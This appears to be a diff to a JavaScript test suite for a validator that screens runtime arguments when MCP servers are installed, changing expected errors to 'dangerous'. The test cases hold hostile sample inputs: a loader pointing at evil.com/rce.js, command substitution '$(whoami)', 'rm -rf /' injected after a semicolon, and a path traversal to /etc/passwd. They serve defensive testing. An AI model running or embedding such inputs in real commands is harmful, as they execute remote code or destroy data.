@@ -1129,36 +1129,58 @@ describe("validateRuntimeArgs", () => {
     expect(() => validateRuntimeArgs(["--port=3000", "--verbose"])).not.toThrow();
   });
 
-  it("rejects --eval flag", () => {
-    expect(() => validateRuntimeArgs(["--eval=process.exit()"])).toThrow(/unrecognized/i);
+  it("accepts common MCP server flags", () => {
+    expect(() => validateRuntimeArgs(["--allow-write", "--read-only", "--no-sandbox"])).not.toThrow();
   });
 
-  it("rejects --require flag", () => {
-    expect(() => validateRuntimeArgs(["--require", "/tmp/malicious.js"])).toThrow(/unrecognized/i);
+  it("accepts bare absolute paths", () => {
+    expect(() => validateRuntimeArgs(["/Users/foo/projects", "/tmp/scratch"])).not.toThrow();
   });
 
-  it("rejects --inspect flag", () => {
-    expect(() => validateRuntimeArgs(["--inspect=0.0.0.0:9229"])).toThrow(/unrecognized/i);
+  it("accepts home-relative paths", () => {
+    expect(() => validateRuntimeArgs(["~/Documents"])).not.toThrow();
+  });
+
+  it("accepts generic key=value flags with safe values", () => {
+    expect(() => validateRuntimeArgs(["--workspace=/path/to/dir", "--base-url=http://localhost:3000"])).not.toThrow();
+  });
+
+  it("rejects --eval flag (dangerous)", () => {
+    expect(() => validateRuntimeArgs(["--eval=process.exit()"])).toThrow(/dangerous/i);
+  });
+
+  it("rejects --require flag (dangerous)", () => {
+    expect(() => validateRuntimeArgs(["--require"])).toThrow(/dangerous/i);
+  });
+
+  it("rejects --inspect flag (dangerous)", () => {
+    expect(() => validateRuntimeArgs(["--inspect=0.0.0.0:9229"])).toThrow(/dangerous/i);
   });
 
   it("rejects -e flag (shorthand for --eval)", () => {
-    expect(() => validateRuntimeArgs(["-e", "require('child_process').exec('id')"])).toThrow(/unrecognized/i);
+    expect(() => validateRuntimeArgs(["-e"])).toThrow(/dangerous/i);
   });
 
-  it("rejects --import flag", () => {
-    expect(() => validateRuntimeArgs(["--import=/tmp/malicious.mjs"])).toThrow(/unrecognized/i);
+  it("rejects --import flag (dangerous)", () => {
+    expect(() => validateRuntimeArgs(["--import=/tmp/malicious.mjs"])).toThrow(/dangerous/i);
+  });
+
+  it("rejects --loader flag (dangerous)", () => {
+    expect(() => validateRuntimeArgs(["--loader=https://evil.com/rce.js"])).toThrow(/dangerous/i);
+  });
+
+  it("rejects --experimental-loader flag (dangerous)", () => {
+    expect(() => validateRuntimeArgs(["--experimental-loader=evil.mjs"])).toThrow(/dangerous/i);
   });
 
   it("rejects arguments containing path traversal (..)", () => {
     expect(() => validateRuntimeArgs(["../../etc/passwd"])).toThrow(/unrecognized/i);
   });
 
-  it("rejects --loader flag (allowlist approach)", () => {
-    expect(() => validateRuntimeArgs(["--loader=https://evil.com/rce.js"])).toThrow(/unrecognized/i);
-  });
-
-  it("rejects --experimental-loader flag", () => {
-    expect(() => validateRuntimeArgs(["--experimental-loader=evil.mjs"])).toThrow(/unrecognized/i);
+  it("rejects shell metacharacters in flag values", () => {
+    expect(() => validateRuntimeArgs(["--config=$(whoami)"])).toThrow(/unrecognized/i);
+    expect(() => validateRuntimeArgs(["--cmd=foo;rm -rf /"])).toThrow(/unrecognized/i);
+    expect(() => validateRuntimeArgs(["--x=a|b"])).toThrow(/unrecognized/i);
   });
 
   it("accepts empty array", () => {
@@ -1274,7 +1296,7 @@ describe("resolveInstallEntry — identifier validation", () => {
         },
       ],
     });
-    expect(() => resolveInstallEntry(server, "claude-desktop")).toThrow(/unrecognized/i);
+    expect(() => resolveInstallEntry(server, "claude-desktop")).toThrow(/dangerous/i);
   });
 
   it("throws for a malicious pypi identifier", () => {
